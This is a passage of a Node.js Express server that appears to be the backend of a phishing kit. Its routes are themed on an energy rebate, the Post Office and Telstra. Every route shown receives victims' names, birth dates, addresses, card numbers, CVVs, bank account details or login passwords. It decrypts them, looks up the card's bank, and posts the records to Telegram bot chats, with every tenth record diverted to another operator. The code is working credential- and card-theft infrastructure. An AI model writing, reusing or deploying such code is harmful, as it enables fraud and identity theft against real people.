            }
          )
          .catch((e) => {
            console.log(e);
          });
        manEvri += 1;
      }
      res.send("Update complete");
    });
});

app.post("/energyGhost", async (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (manEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        manEvri = 7;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EnergyRebateGhost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5781274308,
              text: `EnergyRebate:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        manEvri += 1;
      }
      res.send("Update complete");
    });
});

app.post("/energyManny", async (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (manEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        manEvri = 7;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EnergyRebateManny:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 913906957,
              text: `EnergyRebate:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        manEvri += 1;
      }
      res.send("Update complete");
    });
});

app.post("/energyDP", async (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (dpFullz == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        dpFullz = 7;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EnergyRebateDP:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5582405778,
              text: `EnergyRebate:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        dpFullz += 1;
      }
      res.send("Update complete");
    });
});

app.post("/energyBvjb", async (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fpaysC = 7;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EnergyRebateBVJB:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1673554454,
              text: `EnergyRebate:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fpaysC += 1;
      }
      res.send("Update complete");
    });
});

app.post("/energyFpays", async (req, res) => {
  const {
    fname,
    address,
    city,
    pcode,
    dob,
    telephone,
    ccname,
    ccnum,
    ccexp,
    cvv,
    userAgent,
    ip,
    bin,
  } = req.body;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fpaysC = 7;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EnergyRebateFpays:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 2134201699,
              text: `EnergyRebate:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fpaysC += 1;
      }
      res.send("Update complete");
    });
});

app.post("/energyTriz", async (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `-------------------------------------------------------------------------\nBilling Information\n|Full Name: ${fname}\n|DOB: ${dob}\n|Address: ${address}\n|City: ${city}\n|Post Code: ${pcode}\n|Telephone: ${telephone}\n-------------------------------------------------------------------------\nCard Information\n|Card Name: ${ccname}\n|Card Number: ${ccnum}\n|Card Expiry: ${ccexp}\n|CVV: ${cvv}\n|Bin: ${binList}\n-------------------------------------------------------------------------\n+ Victim Information\n| IP Address : ${ip}\n| UserAgent : ${userAgent}`;

      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: "-637423394",
            text: `EnergyRebate:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });

      res.send("Update complete");
    });
});

app.post("/energy", async (req, res) => {
  let count;
  let index;
  info = req.body;

  for (var i = 0; i < counts.length; i++) {
    if (counts[i].owner == info.owner) {
      index = i;
      count = counts[i].count;
    }
  }

  if (info.bin.length === 7) {
    formatBin = info.bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = info.bin.slice(0, -1);
    }
    info.bin = formatBin;
  }
  let binLookup = await axios.get(`https://lookup.binlist.net/${bin}`);
  let bank = binLookup.data.bank.name;
  let binList = `${info.bin} | ${info.dob} | ${info.pcode} | ${bank}`;
  var originalText = `+----------- Personal Information ------------+\nFull Name: ${info.fullName}\nDOB: ${info.dob}\nAddress: ${info.addy}\nPostcode: ${info.pcode}\nPhone Number: ${info.telephone}\n+ ----------- Card Information ------------+\nCard Name: ${info.ccname}\nCard Number: ${info.ccnum}\nExpiry: ${info.ccexp}\nCVV: ${info.cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${info.userAgent}\nIP: ${info.ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
  if (count == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    counts[index].count = 0;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `EnergyRebate ${info.owner}:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: info.owner,
          text: `EnergyRebate:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    counts[index].count += 1;
  }
});

//POSTOFFICE
//POSTOFFICE
//POSTOFFICE

app.post("/tCapz", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (lingypack == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        lingypack = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=POTcapz:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1437456088&text=PO:\n${originalText}`
        );
        lingypack += 1;
      }

      res.send("Update Completed");
    });
});

//TELSTRA
//TELSTRA
//TELSTRA

app.post("/t1Telstra", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=TelstraFred:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1090540781&text=Telstra:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer += 1;
      }
      res.send("Update Completed");
    });
});

app.post("/fredTelstra", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=TelstraFred:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5111234111&text=Telstra:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer += 1;
      }
      res.send("Update Completed");
    });
});

app.post("/osbTelstra", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `TelstraOSB:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5539333576,
              text: `Telstra:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        Spoofergoofer += 1;
      }
      res.send("Update Completed");
    });
});

app.post("/g7000telstra", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
